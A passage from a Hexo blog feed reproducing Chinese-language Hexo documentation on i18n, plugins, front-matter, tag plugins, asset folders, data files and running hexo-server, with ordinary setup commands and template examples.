__(&#39;index.title&#39;) %&gt;</span><br><span class="line">&#x2F;&#x2F; Home</span><br><span class="line"></span><br><span class="line">&lt;%&#x3D; _p(&#39;index.video&#39;, 3) %&gt;</span><br><span class="line">&#x2F;&#x2F; 3 videos</span><br></pre></td></tr></table></figure><h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><p>您可在 front-matter 中指定该页面的语言，也可在 <code>_config.yml</code> 中修改 <code>i18n_dir</code> 设定，让 Hexo 自动侦测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i18n_dir: :lang</span><br></pre></td></tr></table></figure><p><code>i18n_dir</code> 的预设值是 <code>:lang</code>，也就是说 Hexo 会捕获网址中的第一段以检测语言，举例来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.html &#x3D;&gt; en</span><br><span class="line">&#x2F;archives&#x2F;index.html &#x3D;&gt; en</span><br><span class="line">&#x2F;zh-tw&#x2F;index.html &#x3D;&gt; zh-tw</span><br></pre></td></tr></table></figure><p>捕获到的字符串唯有在语言文件存在的情况下，才会被当作是语言，因此例二 <code>/archives/index.html</code> 中的 <code>archives</code> 就不被当成是语言。</p><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>Hexo 有强大的插件系统，使您能轻松扩展功能而不用修改核心模块的源码。在 Hexo 中有两种形式的插件：</p><h3 id="脚本（Scripts）"><a href="#脚本（Scripts）" class="headerlink" title="脚本（Scripts）"></a>脚本（Scripts）</h3><p>如果您的代码很简单，建议您编写脚本，您只需要把 JavaScript 文件放到 <code>scripts</code> 文件夹，在启动时就会自动载入。</p><h3 id="插件（Packages）"><a href="#插件（Packages）" class="headerlink" title="插件（Packages）"></a>插件（Packages）</h3><p>如果您的代码较复杂，或是您想要发布到 NPM 上，建议您编写插件。首先，在 <code>node_modules</code> 文件夹中建立文件夹，文件夹名称开头必须为 <code>hexo-</code>，如此一来 Hexo 才会在启动时载入否则 Hexo 将会忽略它。</p><p>文件夹内至少要包含 2 个文件：一个是主程序，另一个是 <code>package.json</code>，描述插件的用途和所依赖的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── index.js</span><br><span class="line">└── package.json</span><br></pre></td></tr></table></figure><p><code>package.json</code> 中至少要包含 <code>name</code>, <code>version</code>, <code>main</code> 属性，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package.json&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hexo-my-plugin&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;0.0.1&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>您可以使用 Hexo 提供的官方工具插件来加速开发：</p><ul><li><a href="https://github.com/hexojs/hexo-fs">hexo-fs</a>：文件 IO</li><li><a href="https://github.com/hexojs/hexo-util">hexo-util</a>：工具程式</li><li><a href="https://github.com/hexojs/hexo-i18n">hexo-i18n</a>：本地化（i18n）</li><li><a href="https://github.com/hexojs/hexo-pagination">hexo-pagination</a>：生成分页资料</li></ul><h3 id="发布-1"><a href="#发布-1" class="headerlink" title="发布"></a>发布</h3><p>当您完成插件后，可以考虑将它发布到 <a href="https://hexo.io/plugins">插件列表</a>，让更多人能够使用您的插件。发布插件的步骤和 <a href="https://hexo.io/zh-cn/docs/contributing.html#%E6%9B%B4%E6%96%B0%E6%96%87%E4%BB%B6">更新文件</a> 非常类似。</p><ol><li><p>Fork <a href="https://github.com/hexojs/site">hexojs/site</a></p></li><li><p>把库（repository）复制到电脑上，并安装所依赖的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;&lt;username&gt;&#x2F;site.git</span><br><span class="line">$ cd site</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></li><li><p>编辑 <code>source/_data/plugins.yml</code>，在档案中新增您的插件，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- name: hexo-server</span><br><span class="line">  description: Server module for Hexo.</span><br><span class="line">  link: https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo-server</span><br><span class="line">  tags:</span><br><span class="line">    - official</span><br><span class="line">    - server</span><br><span class="line">    - console</span><br></pre></td></tr></table></figure></li><li><p>推送（push）分支。</p></li><li><p>建立一个新的合并申请（pull request）并描述改动。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> hexo自定义 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo基本操作</title>
      <link href="/2018/05/09/hexo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2018/05/09/hexo%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h1><p>你可以执行下列命令来创建一篇新文章。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>您可以在命令中指定文章的布局（layout），默认为 <code>post</code>，可以通过修改 <code>_config.yml</code> 中的 <code>default_layout</code> 参数来指定默认布局。</p><h2 id="布局（Layout）"><a href="#布局（Layout）" class="headerlink" title="布局（Layout）"></a>布局（Layout）</h2><p>Hexo 有三种默认布局：<code>post</code>、<code>page</code> 和 <code>draft</code>，它们分别对应不同的路径，而您自定义的其他布局和 <code>post</code> 相同，都将储存到 <code>source/_posts</code> 文件夹。</p><table><thead><tr><th>布局</th><th>路径</th></tr></thead><tbody><tr><td><code>post</code></td><td><code>source/_posts</code></td></tr><tr><td><code>page</code></td><td><code>source</code></td></tr><tr><td><code>draft</code></td><td><code>source/_drafts</code></td></tr></tbody></table><blockquote><p>不要处理我的文章</p><p>如果你不想你的文章被处理，你可以将 Front-Matter 中的<code>layout:</code> 设为 <code>false</code> 。</p></blockquote><h2 id="文件名称"><a href="#文件名称" class="headerlink" title="文件名称"></a>文件名称</h2><p>Hexo 默认以标题做为文件名称，但您可编辑 <code>new_post_name</code> 参数来改变默认的文件名称，举例来说，设为 <code>:year-:month-:day-:title.md</code> 可让您更方便的通过日期来管理文章。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>:title</code></td><td>标题（小写，空格将会被替换为短杠）</td></tr><tr><td><code>:year</code></td><td>建立的年份，比如， <code>2015</code></td></tr><tr><td><code>:month</code></td><td>建立的月份（有前导零），比如， <code>04</code></td></tr><tr><td><code>:i_month</code></td><td>建立的月份（无前导零），比如， <code>4</code></td></tr><tr><td><code>:day</code></td><td>建立的日期（有前导零），比如， <code>07</code></td></tr><tr><td><code>:i_day</code></td><td>建立的日期（无前导零），比如， <code>7</code></td></tr></tbody></table><h2 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h2><p>刚刚提到了 Hexo 的一种特殊布局：<code>draft</code>，这种布局在建立时会被保存到 <code>source/_drafts</code> 文件夹，您可通过 <code>publish</code> 命令将草稿移动到 <code>source/_posts</code> 文件夹，该命令的使用方式与 <code>new</code> 十分类似，您也可在命令中指定 <code>layout</code> 来指定布局。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>草稿默认不会显示在页面中，您可在执行时加上 <code>--draft</code> 参数，或是把 <code>render_drafts</code> 参数设为 <code>true</code> 来预览草稿。</p><h2 id="模板（Scaffold）"><a href="#模板（Scaffold）" class="headerlink" title="模板（Scaffold）"></a>模板（Scaffold）</h2><p>在新建文章时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件来建立文件，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure><p>在执行这行指令时，Hexo 会尝试在 <code>scaffolds</code> 文件夹中寻找 <code>photo.md</code>，并根据其内容建立文章，以下是您可以在模版中使用的变量：</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td></tr><tr><td><code>title</code></td><td>标题</td></tr><tr><td><code>date</code></td><td>文件建立日期</td></tr></tbody></table><h1 id="Font-matter"><a href="#Font-matter" class="headerlink" title="Font-matter"></a>Font-matter</h1><p>Front-matter 是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量，举例来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: Hello World</span><br><span class="line">date: 2013&#x2F;7&#x2F;13 20:46:25</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>以下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td><td></td></tr><tr><td><code>title</code></td><td>标题</td><td></td></tr><tr><td><code>date</code></td><td>建立日期</td><td>文件建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td><td>文件更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td><td>true</td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td><td></td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td><td></td></tr><tr><td><code>permalink</code></td><td>覆盖文章网址</td><td></td></tr></tbody></table><h2 id="分类和标签"><a href="#分类和标签" class="headerlink" title="分类和标签"></a>分类和标签</h2><p>只有文章支持分类和标签，您可以在 Front-matter 中设置。在其他系统中，分类和标签听起来很接近，但是在 Hexo 中两者有着明显的差别：分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">categories:</span><br><span class="line">- Diary</span><br><span class="line">tags:</span><br><span class="line">- PS3</span><br><span class="line">- Games</span><br></pre></td></tr></table></figure><blockquote><p>分类方法的分歧</p><p>如果您有过使用WordPress的经验，就很容易误解Hexo的分类方式。WordPress支持对一篇文章设置多个分类，而且这些分类可以是同级的，也可以是父子分类。但是Hexo不支持指定多个同级分类。下面的指定方法：<br>categories:<br>- Diary<br>- Life<br>会使分类<code>Life</code>成为<code>Diary</code>的子分类，而不是并列分类。因此，有必要为您的文章选择尽可能准确的分类。</p></blockquote><h2 id="JSON-Front-matter"><a href="#JSON-Front-matter" class="headerlink" title="JSON Front-matter"></a>JSON Front-matter</h2><p>除了 YAML 外，你也可以使用 JSON 来编写 Front-matter，只要将 <code>---</code> 代换成 <code>;;;</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;title&quot;: &quot;Hello World&quot;,</span><br><span class="line">&quot;date&quot;: &quot;2013&#x2F;7&#x2F;13 20:46:25&quot;</span><br><span class="line">;;;</span><br></pre></td></tr></table></figure><h1 id="标签插件（Tag-Plugins）"><a href="#标签插件（Tag-Plugins）" class="headerlink" title="标签插件（Tag Plugins）"></a>标签插件（Tag Plugins）</h1><p>标签插件和 Front-matter 中的标签不同，它们是用于在文章中快速插入特定内容的插件。</p><h2 id="引用块"><a href="#引用块" class="headerlink" title="引用块"></a>引用块</h2><p>在文章中插入引言，可包含作者、来源和标题。</p><p><strong>别号：</strong> quote</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote [author[, source]] [link] [source_link_title] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><h3 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h3><p><strong>没有提供参数，则只输出普通的 blockquote</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote %&#125;</span><br><span class="line">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper at eu lorem.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.  Pellentesque hendrerit lacus ut purus iaculis feugiat. Sed nec tempor  elit, quis aliquam neque. Curabitur sed diam eget dolor fermentum semper  at eu lorem.</p></blockquote><p><strong>引用书上的句子</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote David Levithan, Wide Awake %&#125;</span><br><span class="line">Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Do not just seek happiness for yourself. Seek happiness for all. Through kindness. Through mercy.</p><p><strong>David Levithan</strong>Wide Awake</p></blockquote><p><strong>引用 Twitter</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote @DevDocs https:&#x2F;&#x2F;twitter.com&#x2F;devdocs&#x2F;status&#x2F;356095192085962752 %&#125;</span><br><span class="line">NEW: DevDocs now(现在)_ comes with syntax highlighting. http:&#x2F;&#x2F;devdocs.io</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><p><strong>引用网络上的文章</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% blockquote Seth Godin http:&#x2F;&#x2F;sethgodin.typepad.com&#x2F;seths_blog&#x2F;2009&#x2F;07&#x2F;welcome-to-island-marketing.html Welcome to Island Marketing %&#125;</span><br><span class="line">Every interaction is both precious and an opportunity to delight.</span><br><span class="line">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Every interaction is both precious and an opportunity to delight.</p></blockquote><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>在文章中插入代码。</p><p><strong>别名：</strong> code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="样例-1"><a href="#样例-1" class="headerlink" title="样例"></a>样例</h3><p><strong>普通的代码块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock %&#125;</span><br><span class="line">alert(&#39;Hello World!&#39;);</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(&#39;Hello World!&#39;);</span><br></pre></td></tr></table></figure><p><strong>指定语言</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock lang:objc %&#125;</span><br><span class="line">[rectangle setX: 10 y: 10 width: 20 height: 20];</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[rectangle setX: 10 y: 10 width: 20 height: 20];</span><br></pre></td></tr></table></figure><p><strong>附加说明</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock Array.map %&#125;</span><br><span class="line">array.map(callback[, thisArg])</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array.maparray.map(callback[, thisArg])</span><br></pre></td></tr></table></figure><p><strong>附加说明和网址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock _.compact http:&#x2F;&#x2F;underscorejs.org&#x2F;#compact Underscore.js %&#125;</span><br><span class="line">_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class="line">&#x3D;&gt; [1, 2, 3]</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_.compactUnderscore.js_.compact([0, 1, false, 2, &#39;&#39;, 3]);</span><br><span class="line">&#x3D;&gt; [1, 2, 3]</span><br></pre></td></tr></table></figure><h2 id="反引号代码块"><a href="#反引号代码块" class="headerlink" title="反引号代码块"></a>反引号代码块</h2><p>另一种形式的代码块，不同的是它使用三个反引号来包裹。</p><h2 id="Pull-Quote"><a href="#Pull-Quote" class="headerlink" title="Pull Quote"></a>Pull Quote</h2><p>在文章中插入 Pull quote。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pullquote [class] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure><h2 id="jsFiddle"><a href="#jsFiddle" class="headerlink" title="jsFiddle"></a>jsFiddle</h2><p>在文章中嵌入 jsFiddle。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% jsfiddle shorttag [tabs] [skin] [width] [height] %&#125;</span><br></pre></td></tr></table></figure><h2 id="Gist"><a href="#Gist" class="headerlink" title="Gist"></a>Gist</h2><p>在文章中嵌入 Gist。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gist gist_id [filename] %&#125;</span><br></pre></td></tr></table></figure><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><p>在文章中插入 iframe。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iframe url [width] [height] %&#125;</span><br></pre></td></tr></table></figure><h2 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h2><p>在文章中插入指定大小的图片。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% img [class names] &#x2F;path&#x2F;to&#x2F;image [width] [height] [title text [alt text]] %&#125;</span><br></pre></td></tr></table></figure><h2 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h2><p>在文章中插入链接，并自动给外部链接添加 <code>target=&quot;_blank&quot;</code> 属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link text url [external] [title] %&#125;</span><br></pre></td></tr></table></figure><h2 id="Include-Code"><a href="#Include-Code" class="headerlink" title="Include Code"></a>Include Code</h2><p>插入 <code>source</code> 文件夹内的代码文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include_code [title] [lang:language] path&#x2F;to&#x2F;file %&#125;</span><br></pre></td></tr></table></figure><h2 id="Youtube"><a href="#Youtube" class="headerlink" title="Youtube"></a>Youtube</h2><p>在文章中插入 Youtube 视频。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% youtube video_id %&#125;</span><br></pre></td></tr></table></figure><h2 id="Vimeo"><a href="#Vimeo" class="headerlink" title="Vimeo"></a>Vimeo</h2><p>在文章中插入 Vimeo 视频。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% vimeo video_id %&#125;</span><br></pre></td></tr></table></figure><h2 id="引用文章"><a href="#引用文章" class="headerlink" title="引用文章"></a>引用文章</h2><p>引用其他文章的链接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% post_path slug %&#125;</span><br><span class="line">&#123;% post_link slug [title] %&#125;</span><br></pre></td></tr></table></figure><h2 id="引用资源"><a href="#引用资源" class="headerlink" title="引用资源"></a>引用资源</h2><p>引用文章的资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_path slug %&#125;</span><br><span class="line">&#123;% asset_img slug [title] %&#125;</span><br><span class="line">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure><h2 id="Raw"><a href="#Raw" class="headerlink" title="Raw"></a>Raw</h2><p>如果您想在文章中插入 Swig 标签，可以尝试使用 Raw 标签，以免发生解析异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure><h1 id="资源文件夹"><a href="#资源文件夹" class="headerlink" title="资源文件夹"></a>资源文件夹</h1><p>资源（Asset）代表 <code>source</code> 文件夹中除了文章以外的所有文件，例如图片、CSS、JS 文件等。比方说，如果你的Hexo项目中只有少量图片，那最简单的方法就是将它们放在 <code>source/images</code> 文件夹中。然后通过类似于 <code>![](/images/image.jpg)</code> 的方法访问它们。</p><h2 id="文章资源文件夹"><a href="#文章资源文件夹" class="headerlink" title="文章资源文件夹"></a>文章资源文件夹</h2><p>对于那些想要更有规律地提供图片和其他资源以及想要将他们的资源分布在各个文章上的人来说，Hexo也提供了更组织化的方式来管理资源。这个稍微有些复杂但是管理资源非常方便的功能可以通过将 <code>config.yml</code> 文件中的 <code>post_asset_folder</code> 选项设为 <code>true</code> 来打开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.ymlpost_asset_folder: true</span><br></pre></td></tr></table></figure><p>当资源文件管理功能打开后，Hexo将会在你每一次通过 <code>hexo new [layout] &lt;title&gt;</code> 命令创建新文章时自动创建一个文件夹。这个资源文件夹将会有与这个 markdown 文件一样的名字。将所有与你的文章有关的资源放在这个关联文件夹中之后，你可以通过相对路径来引用它们，这样你就得到了一个更简单而且方便得多的工作流。</p><h2 id="相对路径引用的标签插件"><a href="#相对路径引用的标签插件" class="headerlink" title="相对路径引用的标签插件"></a>相对路径引用的标签插件</h2><p>通过常规的  markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo  2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3  的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_path slug %&#125;</span><br><span class="line">&#123;% asset_img slug [title] %&#125;</span><br><span class="line">&#123;% asset_link slug [title] %&#125;</span><br></pre></td></tr></table></figure><p>比如说：当你打开文章资源文件夹功能后，你把一个 <code>example.jpg</code> 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 <code>![](/example.jpg)</code> ，它将 <em>不会</em> 出现在首页上。（但是它会在文章中按你期待的方式工作）</p><p>正确的引用图片方式是使用下列的标签插件而不是 markdown ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img example.jpg This is an example image %&#125;</span><br></pre></td></tr></table></figure><p>通过这种方式，图片将会同时出现在文章和主页以及归档页中。</p><h1 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h1><p>有时您可能需要在主题中使用某些资料，而这些资料并不在文章内，并且是需要重复使用的，那么您可以考虑使用 Hexo 3.0 新增的「数据文件」功能。此功能会载入 <code>source/_data</code> 内的 YAML 或 JSON 文件，如此一来您便能在网站中复用这些文件了。</p><p>举例来说，在 <code>source/_data</code> 文件夹中新建 <code>menu.yml</code> 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Home: &#x2F;</span><br><span class="line">Gallery: &#x2F;gallery&#x2F;</span><br><span class="line">Archives: &#x2F;archives&#x2F;</span><br></pre></td></tr></table></figure><p>您就能在模板中使用这些资料：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% for (var link in site.data.menu) &#123; %&gt;</span><br><span class="line">  &lt;a href&#x3D;&quot;&lt;%&#x3D; site.data.menu[link] %&gt;&quot;&gt; &lt;%&#x3D; link %&gt; &lt;&#x2F;a&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>渲染结果如下 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#x2F;&quot;&gt; Home &lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&#x2F;gallery&#x2F;&quot;&gt; Gallery &lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&#x2F;archives&#x2F;&quot;&gt; Archives &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h1 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h1><h2 id="hexo-server"><a href="#hexo-server" class="headerlink" title="hexo-server"></a><a href="https://github.com/hexojs/hexo-server">hexo-server</a></h2><p>Hexo 3.0 把服务器独立成了个别模块，您必须先安装 <a href="https://github.com/hexojs/hexo-server">hexo-server</a> 才能使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-server --save</span><br></pre></td></tr></table></figure><p>安装完成后，输入以下命令以启动服务器，您的网站会在 <code>http://localhost:4000</code> 下启动。在服务器启动期间，Hexo 会监视文件变动并自动更新，您无须重启服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>如果您想要更改端口，或是在执行时遇到了 <code>EADDRINUSE</code> 错误，可以在执行时使用 <code>-p</code> 选项指定其他端口，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server -p 5000</span><br></pre></td></tr></table></figure><h3 id="静态模式"><a href="#静态模式" class="headerlink" title="静态模式"></a>静态模式</h3><p>在静态模式下，服务器只处理 <code>public</code> 文件夹内的文件，而不会处理文件变动，在执行时，您应该先自行执行 <code>hexo generate</code>，此模式通常用于生产环境（production mode）下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server -s</span><br></pre></td></tr></table></figure><h3 id="自定义-IP"><a href="#自定义-IP" class="headerlink" title="自定义 IP"></a>自定义 IP</h3><p>服务器默认运行在 <code>0.0.0.0</code>，您可以覆盖默认的 IP 设置，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server -i 